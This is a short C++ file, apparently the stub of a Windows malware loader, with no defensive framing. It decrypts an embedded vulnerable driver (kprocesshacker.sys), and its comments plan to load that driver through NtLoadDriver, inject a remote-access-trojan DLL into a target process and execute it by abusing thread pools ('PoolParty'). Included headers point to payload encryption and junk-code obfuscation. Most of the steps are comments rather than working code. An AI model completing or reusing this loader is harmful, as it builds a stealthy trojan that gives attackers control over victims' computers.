#include <vector>
#include <windows.h>
#include "byte_encryption.h"
#include "resources.h"
#include "junk_codes.h"

//typedef NTSTATUS (*NTAPI RtlAdjustPrivilege_t)(
//    ULONG Privilege,
//    BOOLEAN Enable,
//    BOOLEAN Client,
//    PBOOLEAN WasEnabled
//);

int main(int argc, char** argv)
{
	// Load the vulnerable driver: kprocesshacker.sys
    /*
    * Decrypt the driver from memory
    * Write the driver to disk (to System32)
    * Create the registry path
    * call NtLoadDriver()
    * - Possibly unload the driver after injecting
    */
    std::vector<uint8_t> vulnDriver = decrypt_bytes(vuln_driver);

    // Inject the RAT dll to the target process' virtual memory (after performing relocations)

    // Execute the AddressOfEntryPoint of the dll in the target process via abusing Thread pools (PoolParty)
    
	return 0;
}